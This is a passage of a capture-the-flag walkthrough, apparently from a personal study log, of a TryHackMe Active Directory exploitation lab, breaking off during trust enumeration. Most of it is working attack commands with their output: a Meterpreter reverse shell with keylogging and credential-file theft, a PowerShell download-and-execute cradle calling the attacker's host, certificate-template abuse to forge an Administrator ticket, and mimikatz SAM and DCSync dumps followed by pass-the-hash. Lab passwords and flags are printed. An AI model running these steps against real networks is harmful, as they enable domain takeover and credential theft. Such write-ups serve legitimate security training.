┌──(root💀kali)-[~/tryhackme/ExploitingActiveDirectory]
└─# msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.50.57.67; set LPORT '4444'; exploit"
[*] Using configured payload generic/shell_reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
LHOST => 10.50.57.67
LPORT => 4444
[*] Started reverse TCP handler on 10.50.57.67:4444 
[*] Sending stage (200774 bytes) to 10.200.60.201
[*] Meterpreter session 1 opened (10.50.57.67:4444 -> 10.200.60.201:54456) at 2022-08-12 05:09:55 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```



ps查看用户t1_trevor.jones的进程

```
meterpreter > ps 

Process List
============

 PID   PPID  Name             Arch  Session  User                Path
 ---   ----  ----             ----  -------  ----                ----
 3412  688   wsmprovhost.exe  x64   0        ZA\t1_trevor.jones  C:\Windows\System32\wsmprovhost.exe

```

迁移进程，以的身份执行下面的操作
```
meterpreter > migrate 3412
[*] Migrating from 3932 to 3412...
[*] Migration completed successfully.
meterpreter > getuid
Server username: ZA\t1_trevor.jones
```

开启键盘监听
```
meterpreter > keyscan_start
Starting the keystroke sniffer ...
```


下载keepass文件
```
meterpreter > download PasswordDatabase.kdbx
[*] Downloading: PasswordDatabase.kdbx -> /root/tryhackme/ExploitingActiveDirectory/PasswordDatabase.kdbx
[*] Downloaded 1.84 KiB of 1.84 KiB (100.0%): PasswordDatabase.kdbx -> /root/tryhackme/ExploitingActiveDirectory/PasswordDatabase.kdbx
[*] download   : PasswordDatabase.kdbx -> /root/tryhackme/ExploitingActiveDirectory/PasswordDatabase.kdbx
```


这里我同时监听了trevor.local和t1_trevor.jones的键盘记录，等了很久也没有收集到密码，感觉lab有问题。。。


> What application is used to open the kdbx credential database?

> keepass

> What meterpreter command do we use to move from SYSTEM to user context?

> migrate

> What is the password of the credential database?

> Imreallysurenoonewillguessmypassword

> What is the value of the flag stored in the credential database?

> THM{AD.Users.Can.Give.Up.Good.Secrets}



# Task 6  Exploiting GPOs

RDP连接
```
xfreerdp /v:thmwrk1.za.tryhackme.loc /u:t2_henry.harvey /p:'max.123456'
```

rdp真是太卡了

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660643241183.jpg)


> What object allows users to configure Windows policies?

> Group Policy Object

> What AD feature allows us to configure GPOs for the entire AD structure?

> Group Policy Management

> What is the name of the GPO that our compromised AD account owns?

> Management Server Pushes

> What is the value of the flag stored on THMSERVER2 in the Administrator's Desktop directory (flag4.txt)?

> THM{Exploiting.GPOs.For.Fun.And.Profit}

# Task 7  Exploiting Certificates


powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.50.57.67:80/a'))"

max.smith Password: Kdbt1458


xfreerdp /v:THMSERVER2.za.tryhackme.loc /u:max.smith /p:'Kdbt1458'


枚举证书信息
```
beacon> execute-assembly tools/Certify.exe cas
[*] Tasked beacon to run .NET program: Certify.exe cas
[+] host called home, sent: 280113 bytes
[+] received output:


   _____          _   _  __              

  / ____|        | | (_)/ _|             

 | |     ___ _ __| |_ _| |_ _   _        

 | |    / _ \ '__| __| |  _| | | |      

 | |___|  __/ |  | |_| | | | |_| |       

  \_____\___|_|   \__|_|_|  \__, |   

                             __/ |       

                            |___./        

  v1.0.0                               



[*] Action: Find certificate authorities

[*] Using the search base 'CN=Configuration,DC=tryhackme,DC=loc'



[*] Root CAs


    Cert SubjectName              : CN=tryhackme-THMROOTDC-CA, DC=tryhackme, DC=loc
    Cert Thumbprint               : B889293D08301677549DE575F333DC67B6186713
    Cert Serial                   : 388395280C11819340233376332476B6
    Cert Start Date               : 4/27/2022 6:19:46 PM
    Cert End Date                 : 4/27/2027 6:29:41 PM


[+] received output:
    Cert Chain                    : CN=tryhackme-THMROOTDC-CA,DC=tryhackme,DC=loc
    Cert SubjectName              : CN=za-THMDC-CA, DC=za, DC=tryhackme, DC=loc
    Cert Thumbprint               : C12FCB4B88467854B3D4D7F762ADB50B0FD8346E
    Cert Serial                   : 1EF93E3A3DA3249842EF04E3DA57E190
    Cert Start Date               : 4/27/2022 7:58:15 PM
    Cert End Date                 : 4/27/2027 8:08:09 PM
    Cert Chain                    : CN=za-THMDC-CA,DC=za,DC=tryhackme,DC=loc


[*] NTAuthCertificates - Certificates that enable authentication:
    Cert SubjectName              : CN=za-THMDC-CA, DC=za, DC=tryhackme, DC=loc
    Cert Thumbprint               : C12FCB4B88467854B3D4D7F762ADB50B0FD8346E
    Cert Serial                   : 1EF93E3A3DA3249842EF04E3DA57E190
    Cert Start Date               : 4/27/2022 7:58:15 PM
    Cert End Date                 : 4/27/2027 8:08:09 PM
    Cert Chain                    : CN=za-THMDC-CA,DC=za,DC=tryhackme,DC=loc



    Cert SubjectName              : CN=tryhackme-THMROOTDC-CA, DC=tryhackme, DC=loc
    Cert Thumbprint               : B889293D08301677549DE575F333DC67B6186713
    Cert Serial                   : 388395280C11819340233376332476B6
    Cert Start Date               : 4/27/2022 6:19:46 PM
    Cert End Date                 : 4/27/2027 6:29:41 PM
    Cert Chain                    : CN=tryhackme-THMROOTDC-CA,DC=tryhackme,DC=loc




[*] Enterprise/Enrollment CAs:


    Enterprise CA Name            : tryhackme-THMROOTDC-CA
    DNS Hostname                  : THMROOTDC.tryhackme.loc
    FullName                      : THMROOTDC.tryhackme.loc\tryhackme-THMROOTDC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=tryhackme-THMROOTDC-CA, DC=tryhackme, DC=loc
    Cert Thumbprint               : B889293D08301677549DE575F333DC67B6186713
    Cert Serial                   : 388395280C11819340233376332476B6
    Cert Start Date               : 4/27/2022 6:19:46 PM
    Cert End Date                 : 4/27/2027 6:29:41 PM
    Cert Chain                    : CN=tryhackme-THMROOTDC-CA,DC=tryhackme,DC=loc
    UserSpecifiedSAN              : Disabled
    CA Permissions                :

      Owner: BUILTIN\Administrators        S-1-5-32-544



      Access Rights                                     Principal
      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               TRYHACKME\Domain Admins       S-1-5-21-3330634377-1326264276-632209373-512
      Allow  ManageCA, ManageCertificates               TRYHACKME\Enterprise Admins   S-1-5-21-3330634377-1326264276-632209373-519
    Enrollment Agent Restrictions : None


[+] received output:
    Enabled Certificate Templates:

        DirectoryEmailReplication
        DomainControllerAuthentication
        KerberosAuthentication
        EFSRecovery
        EFS
        DomainController
        WebServer
        Machine
        User
        SubCA
        Administrator

    Enterprise CA Name            : za-THMDC-CA
    DNS Hostname                  : THMDC.za.tryhackme.loc
    FullName                      : THMDC.za.tryhackme.loc\za-THMDC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=za-THMDC-CA, DC=za, DC=tryhackme, DC=loc
    Cert Thumbprint               : C12FCB4B88467854B3D4D7F762ADB50B0FD8346E
    Cert Serial                   : 1EF93E3A3DA3249842EF04E3DA57E190
    Cert Start Date               : 4/27/2022 7:58:15 PM
    Cert End Date                 : 4/27/2027 8:08:09 PM


[+] received output:
    Cert Chain                    : CN=za-THMDC-CA,DC=za,DC=tryhackme,DC=loc
    UserSpecifiedSAN              : Disabled
    CA Permissions                :

      Owner: BUILTIN\Administrators        S-1-5-32-544



      Access Rights                                     Principal


      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               TRYHACKME\Enterprise Admins   S-1-5-21-3330634377-1326264276-632209373-519
      Allow  ManageCA, ManageCertificates               ZA\Domain Admins              S-1-5-21-3885271727-2693558621-2658995185-512

    Enrollment Agent Restrictions : None


[+] received output:
    Enabled Certificate Templates:

        WebTemplateRequest
        Web Server Cert Template
        DirectoryEmailReplication
        DomainControllerAuthentication
        KerberosAuthentication
        EFSRecovery
        EFS
        DomainController
        WebServer
        Machine
        User
        SubCA
        Administrator

Certify completed in 00:01:12.9574954
```


查找证书漏洞
```
beacon> execute-assembly tools/Certify.exe find /vulnerable
[*] Tasked beacon to run .NET program: Certify.exe find /vulnerable
[+] host called home, sent: 280139 bytes
[+] received output:

   _____          _   _  __              
  / ____|        | | (_)/ _|             
 | |     ___ _ __| |_ _| |_ _   _        
 | |    / _ \ '__| __| |  _| | | |      
 | |___|  __/ |  | |_| | | | |_| |       
  \_____\___|_|   \__|_|_|  \__, |   
                             __/ |       
                            |___./        
  v1.0.0                               

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=tryhackme,DC=loc'

[*] Listing info about the Enterprise CA 'tryhackme-THMROOTDC-CA'

    Enterprise CA Name            : tryhackme-THMROOTDC-CA
    DNS Hostname                  : THMROOTDC.tryhackme.loc
    FullName                      : THMROOTDC.tryhackme.loc\tryhackme-THMROOTDC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=tryhackme-THMROOTDC-CA, DC=tryhackme, DC=loc
    Cert Thumbprint               : B889293D08301677549DE575F333DC67B6186713
    Cert Serial                   : 388395280C11819340233376332476B6
    Cert Start Date               : 4/27/2022 6:19:46 PM
    Cert End Date                 : 4/27/2027 6:29:41 PM

[+] received output:
    Cert Chain                    : CN=tryhackme-THMROOTDC-CA,DC=tryhackme,DC=loc
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               TRYHACKME\Domain Admins       S-1-5-21-3330634377-1326264276-632209373-512
      Allow  ManageCA, ManageCertificates               TRYHACKME\Enterprise Admins   S-1-5-21-3330634377-1326264276-632209373-519
    Enrollment Agent Restrictions : None

[*] Listing info about the Enterprise CA 'za-THMDC-CA'

    Enterprise CA Name            : za-THMDC-CA
    DNS Hostname                  : THMDC.za.tryhackme.loc
    FullName                      : THMDC.za.tryhackme.loc\za-THMDC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=za-THMDC-CA, DC=za, DC=tryhackme, DC=loc
    Cert Thumbprint               : C12FCB4B88467854B3D4D7F762ADB50B0FD8346E
    Cert Serial                   : 1EF93E3A3DA3249842EF04E3DA57E190
    Cert Start Date               : 4/27/2022 7:58:15 PM
    Cert End Date                 : 4/27/2027 8:08:09 PM
    Cert Chain                    : CN=za-THMDC-CA,DC=za,DC=tryhackme,DC=loc
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               TRYHACKME\Enterprise Admins   S-1-5-21-3330634377-1326264276-632209373-519
      Allow  ManageCA, ManageCertificates               ZA\Domain Admins              S-1-5-21-3885271727-2693558621-2658995185-512
    Enrollment Agent Restrictions : None

[!] Vulnerable Certificates Templates :

    CA Name                               : THMDC.za.tryhackme.loc\za-THMDC-CA
    Template Name                         : WebTemplateRequest
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions

[+] received output:
      Enrollment Permissions
        Enrollment Rights           : TRYHACKME\Domain Admins       S-1-5-21-3330634377-1326264276-632209373-512
                                      TRYHACKME\Enterprise Admins   S-1-5-21-3330634377-1326264276-632209373-519
        All Extended Rights         : TRYHACKME\Domain Users        S-1-5-21-3330634377-1326264276-632209373-513
      Object Control Permissions
        Owner                       : TRYHACKME\Administrator       S-1-5-21-3330634377-1326264276-632209373-500
        Full Control Principals     : TRYHACKME\Domain Users        S-1-5-21-3330634377-1326264276-632209373-513
        WriteOwner Principals       : TRYHACKME\Administrator       S-1-5-21-3330634377-1326264276-632209373-500
                                      TRYHACKME\Domain Admins       S-1-5-21-3330634377-1326264276-632209373-512
                                      TRYHACKME\Domain Users        S-1-5-21-3330634377-1326264276-632209373-513
                                      TRYHACKME\Enterprise Admins   S-1-5-21-3330634377-1326264276-632209373-519
        WriteDacl Principals        : TRYHACKME\Administrator       S-1-5-21-3330634377-1326264276-632209373-500
                                      TRYHACKME\Domain Admins       S-1-5-21-3330634377-1326264276-632209373-512
                                      TRYHACKME\Domain Users        S-1-5-21-3330634377-1326264276-632209373-513
                                      TRYHACKME\Enterprise Admins   S-1-5-21-3330634377-1326264276-632209373-519
        WriteProperty Principals    : TRYHACKME\Administrator       S-1-5-21-3330634377-1326264276-632209373-500
                                      TRYHACKME\Domain Admins       S-1-5-21-3330634377-1326264276-632209373-512
                                      TRYHACKME\Domain Users        S-1-5-21-3330634377-1326264276-632209373-513
                                      TRYHACKME\Enterprise Admins   S-1-5-21-3330634377-1326264276-632209373-519



Certify completed in 00:00:13.2274851

```



根据证书请求tgt
```
beacon> run Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:cert.pfx /password:123456 /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:10.200.60.101 /nowrap
[*] Tasked beacon to run: Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:cert.pfx /password:123456 /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:10.200.60.101 /nowrap
[+] host called home, sent: 190 bytes
[+] received output:


   ______        _                      

  (_____ \      | |                     

   _____) )_   _| |__  _____ _   _  ___ 

  |  __  /| | | |  _ \| ___ | | | |/___)

  | |  \ \| |_| | |_) ) ____| |_| |___ |

  |_|   |_|____/|____/|_____)____/(___/



  v2.0.0 



[*] Action: Ask TGT



[*] Using PKINIT with etype aes256_cts_hmac_sha1 and subject: CN=MyCert 

[*] Building AS-REQ (w/ PKINIT preauth) for: 'za.tryhackme.loc\Administrator'

[+] TGT request successful!

[*] base64(ticket.kirbi):



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



Exception: c:\tools\administrator.kirbi already exists! Data not written to file.





  ServiceName              :  krbtgt/za.tryhackme.loc

  ServiceRealm             :  ZA.TRYHACKME.LOC

  UserName                 :  Administrator

  UserRealm                :  ZA.TRYHACKME.LOC

  StartTime                :  8/16/2022 3:45:54 PM

  EndTime                  :  8/17/2022 1:45:54 AM

  RenewTill                :  8/23/2022 3:45:54 PM

  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable

  KeyType                  :  aes256_cts_hmac_sha1

  Base64(key)              :  F8u7yahG2+0WjzvmifJsW4hNuu8ZbhxxXEVGCzvl0kk=

  ASREP (key)              :  5E423CBABF1CBF7E95A23C464BA8CC7926B417254C2E882B6616BDB62C7E36C5


```


生成tgt，制作成证书

```
[IO.File]::WriteAllBytes("C:\Users\max\desktop\Administrator.kirbi", [Convert]::FromBase64String("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"))
```


访问DC
```
beacon> make_token za\Administrator fakepass
[*] Tasked beacon to create a token for za\Administrator
[+] host called home, sent: 43 bytes
[+] Impersonated ZA\max.smith
beacon> kerberos_ticket_use downloads/Administrator.kirbi
[*] Tasked beacon to apply ticket in /root/CobaltStrike/downloads/Administrator.kirbi
[+] host called home, sent: 3114 bytes
beacon> dir \\THMDC.za.tryhackme.loc\c$\
[-] Unknown command: dir \\THMDC.za.tryhackme.loc\c$\
beacon> ls \\THMDC.za.tryhackme.loc\c$\
[*] Tasked beacon to list files in \\THMDC.za.tryhackme.loc\c$\
[+] host called home, sent: 45 bytes
[*] Listing: \\THMDC.za.tryhackme.loc\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     04/25/2022 19:06:39   $Recycle.Bin
          dir     03/21/2020 20:49:34   Boot
          dir     03/21/2020 20:25:04   Documents and Settings
          dir     09/15/2018 08:19:00   PerfLogs
          dir     03/21/2020 20:31:12   Program Files
          dir     03/21/2020 20:28:23   Program Files (x86)
          dir     05/01/2022 16:42:24   ProgramData
          dir     04/25/2022 19:06:08   Recovery
          dir     04/25/2022 19:16:18   System Volume Information
          dir     04/25/2022 19:13:38   tmp
          dir     08/16/2022 01:47:34   Users
          dir     04/25/2022 19:11:03   vagrant
          dir     04/27/2022 20:12:00   Windows
 399kb    fil     03/21/2020 20:38:26   bootmgr
 1b       fil     09/15/2018 08:12:30   BOOTNXT
 8kb      fil     03/22/2020 04:23:43   BOOTSECT.BAK
 103b     fil     01/04/2022 07:47:26   delete-vagrant-user.ps1
 169b     fil     05/01/2022 09:11:47   dns_entries.csv
 384mb    fil     08/16/2022 13:54:25   pagefile.sys
 1kb      fil     05/01/2022 09:17:19   thm-network-setup-dc.ps1
```



![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660661678470.png)


横向到DC

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660661925404.png)


拿到flag
```
beacon> shell type flag5.txt
[*] Tasked beacon to run: type flag5.txt
[+] host called home, sent: 45 bytes
[+] received output:
THM{AD.Certs.Can.Get.You.DA}
```



> What does the user create to ask the CA for a certificate?

> Certificate signing request

> What is the name of Microsoft's PKI implementation?

> Active Directory Certificate Services

> What is the value of the flag stored on THMDC in the Administrator's Desktop directory (flag5.txt)?

> THM{AD.Certs.Can.Get.You.DA}


后渗透

dump出sam数据库
```
beacon> mimikatz lsadump::sam
[*] Tasked beacon to run mimikatz's lsadump::sam command
[+] host called home, sent: 750702 bytes
[+] received output:
Domain : THMDC
SysKey : 938b8d50f4c2193f8a46fcd0d5f9b363
Local SID : S-1-5-21-1725362353-2874119851-1837711889

SAMKey : 07087f5b35a9872dc5ea14fa41016e32

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: aeda8b62fd15a38022aaeffd6757c677

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
```


pth验证
```
┌──(root㉿kali)-[~]
└─# python3 /usr/share/doc/python3-impacket/examples/psexec.py  -hashes "af636dea707fa9cf431562c90e8a4044:aeda8b62fd15a38022aaeffd6757c677" Administrator@10.200.60.101 
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.200.60.101.....
[*] Found writable share ADMIN$
[*] Uploading file OWYNvVJV.exe
[*] Opening SVCManager on 10.200.60.101.....
[*] Creating service EyCH on 10.200.60.101.....
[*] Starting service EyCH.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1098]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
THMDC

```

或者
```
pth za\Administrator aeda8b62fd15a38022aaeffd6757c677
```

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660663208934.png)


# Task 8  Exploiting Domain Trustsss

获取krbtgt的哈希

```
beacon> mimikatz lsadump::dcsync /user:za\krbtgt
[*] Tasked beacon to run mimikatz's lsadump::dcsync /user:za\krbtgt command
[+] host called home, sent: 750721 bytes
[+] received output:
[DC] 'za.tryhackme.loc' will be the domain
[DC] 'THMDC.za.tryhackme.loc' will be the DC server
[DC] 'za\krbtgt' will be the user account

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   : 
Password last change : 2022/04/25 19:18:22
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 16f9af38fca3ada405386b3b57366082
    ntlm- 0: 16f9af38fca3ada405386b3b57366082
    lm  - 0: 35c7b671efe40860dc078afd2786c902

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 4bf7050f5f09f6d59a8699081d9ed432

* Primary:Kerberos-Newer-Keys *
    Default Salt : ZA.TRYHACKME.LOCkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 9b52d4ffae227e50025574e4347783ee4f4f6c01c110b1ad4c715d0c977558ca
      aes128_hmac       (4096) : c893fd72ddf7fe2ee545f52b8368602f
      des_cbc_md5       (4096) : d904d37f8ab6fed6

* Primary:Kerberos *
    Default Salt : ZA.TRYHACKME.LOCkrbtgt
    Credentials
      des_cbc_md5       : d904d37f8ab6fed6

* Packages *
    NTLM-Strong-NTOWF

    ...
```

枚举所有域信任关系,从结果可以知道父域和子域之间是双向信任
```
beacon> mimikatz lsadump::trust /patch
[*] Tasked beacon to run mimikatz's lsadump::trust /patch command
[+] host called home, sent: 750704 bytes
[+] received output:

Current domain: ZA.TRYHACKME.LOC (ZA / S-1-5-21-3885271727-2693558621-2658995185)

Domain: TRYHACKME.LOC (TRYHACKME / S-1-5-21-3330634377-1326264276-632209373)
 [  In ] ZA.TRYHACKME.LOC -> TRYHACKME.LOC
